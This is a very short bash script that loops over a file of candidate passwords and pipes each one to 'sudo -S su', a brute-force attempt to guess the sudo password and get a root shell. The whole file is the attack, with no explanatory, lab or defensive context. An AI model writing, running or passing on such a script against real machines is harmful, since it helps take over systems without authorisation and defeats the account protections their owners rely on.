#!/bin/bash

for i in $(cat passwords)  
do
echo $i | sudo -S su
done

